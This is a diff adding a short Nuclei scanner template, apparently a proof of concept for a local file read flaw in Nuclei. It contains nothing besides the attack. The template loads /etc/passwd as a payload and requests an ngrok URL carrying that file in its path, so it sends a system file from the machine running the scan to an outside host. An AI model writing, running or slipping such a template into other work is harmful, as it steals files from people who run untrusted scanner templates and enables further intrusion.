@@ -1,0 +1,15 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
+id: lfr-poc
+
+info:
+  name: Local File Read on Nuclei with Exfiltration
+  author: caioluders
+  severity: critical
+  description: You got it
+
+http:
+  - method: GET
+    payloads:
+      passwd: /etc/passwd
+    path:
+      - "https://133713371337.ngrok.io/{{passwd}}"
